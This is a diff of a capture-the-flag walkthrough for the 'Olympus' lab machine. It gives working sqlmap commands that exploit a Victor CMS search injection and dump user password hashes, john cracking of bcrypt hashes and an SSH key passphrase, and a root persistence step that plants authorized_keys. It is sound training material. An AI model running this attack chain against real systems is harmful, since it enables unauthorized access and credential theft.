@@ -19,17 +19,20 @@ Navigating to directory /~webmaster shows:
 
 ![image](https://user-images.githubusercontent.com/93153300/198897665-9094fb42-1a16-4c90-a3e7-7b1ea732ec7c.png)
 
-The top left corner shows Victor’s CMS.  Let’s check for exploits on victor cms with command:   searchsploit victor\
-Searchsploit shows a few exploits on victor cms.   Opening the search.php sql injection found by searchsploit with command: searchsploit -x  php/webapps/48734.txt,  shows: 
+The top left corner shows Victor’s CMS.  Let’s check for exploits on victor cms with command:   searchsploit victor
+
+![image](https://user-images.githubusercontent.com/93153300/200088352-a7c47cdf-3bd0-41e4-9167-adf823a120d3.png)
+
+Open the exploit 48734.txt with command: searchsploit -x  php/webapps/48734.txt  
+
 ![image](https://user-images.githubusercontent.com/93153300/198897674-f247569f-5ca4-4037-84d0-6af51c71d847.png)
 
-Exploit shows that parameter search is vulnerable to sql injection.  As shown in the exploit, we will use sqlmap to extract sensitive information.  It doesn’t matter what random word you put in the search parameter for sqlmap, I’ll just put the word blob:
-sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search –dbs
-Output shows:
+The exploit shows that the parameter 'search' is vulnerable to sql injection.  As shown in the exploit, we will use sqlmap to extract sensitive information: sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search –dbs \
+Sqlmap found 6 databases:
 
 ![image](https://user-images.githubusercontent.com/93153300/198897682-58ae695d-4009-4b4a-8020-a7098814a1e8.png)
 
-sqlmap found the sql injection and extracted 6 databases.  Let’s get the table names on olympus:
+Let’s get the table names on olympus:
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus –tables\
 Output shows:
 
@@ -42,11 +45,11 @@ There is another interesting table called users.  Check the columns for the tabl
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns
 
 Found columns user_name and user_password.  Dump the information to those 2 columns:\
-sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns -C user_name,user_password –dump
+sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns -C user_name,user_password --dump
 
 ![image](https://user-images.githubusercontent.com/93153300/198897708-5a29bbfa-51d1-4d45-b7e3-8d4a4267d572.png)
 Looks like we found 3 users, and their hashed passwords.  Use john to try and crack the hashes.  First, check what hash type we are dealing with, as we will want to tell john the hash type.   Use command nth:  nth -t '$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C'\
-nth command says it’s a bcrypt hash.  Put the 3 hashes into a file and name it hash, the file should look like this:
+nth command says it’s a bcrypt hash.  Put the 3 hashes into a file and name it hash. The file should look like this:
 
 ![image](https://user-images.githubusercontent.com/93153300/198897711-80e4a730-a0f8-4aad-a05a-ca8780415bb6.png)
 
@@ -116,10 +119,8 @@ We now have zeus’s private ssh key.  Use that to ssh in as zeus. First, downlo
 Finally use the key to ssh in as zeus:\
 ssh -i id_rsatarget zeus@10.10.105.247
 
-It asks for a passphrase, so we can’t log in yet, we need to figure out the passphrase.  Use ssh2john to crack the passphrase.  First, convert the id_rsatarget key into a hash john can work with: \
-ssh2john id_rsatarget > john.txt\
-Next crack the hash to get the passphrase:\
-john john.txt –wordlist=/usr/share/wordlists/rockyou.txt\
+It asks for a passphrase, so we can’t log in yet, we need to figure out the passphrase.  Use john to crack the passphrase.  First, convert the id_rsatarget key into a hash john can work with.  Use command: ssh2john id_rsatarget > john.txt \
+Next crack the hash to get the passphrase with command: john john.txt –wordlist=/usr/share/wordlists/rockyou.txt\
 It worked, the passphrase is snowflake
 
 Back to logging in with ssh private key:\
@@ -176,12 +177,10 @@ We get the flag and some additional information.  The file root.flag says: \
 “PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)”
 ___________________________________________________
 **Persistence and getting the final flag**:\
-Create ssh keys: ssh-keygen \
-To be able to log in with the private key we just created, we need to copy the public key we just created into a file called authorized_keys: cp id_rsa.pub authorized_keys \
-Download the ssh private key and change the file to proper permissions so that it doesn’t error:\
-chmod 600 id_rsa_roottarget\
-Ssh into target as root:\
-ssh -i id_rsa_roottarget root@10.10.105.247
+Create ssh keys with command: ssh-keygen \
+To be able to log in with the private key we just created, we need to copy the public key we just created into a file called authorized_keys. Use command: cp id_rsa.pub authorized_keys \
+Download the ssh private key and change the file to proper permissions so that it doesn’t error with command: chmod 600 id_rsa_roottarget\
+ssh into the target as root with command: ssh -i id_rsa_roottarget root@10.10.105.247
 
 Search for the final flag with command: \
 grep -riI "flag{" / 2>/dev/null           →       Found the flag in etc/ssl/private/.b0nus.fl4g
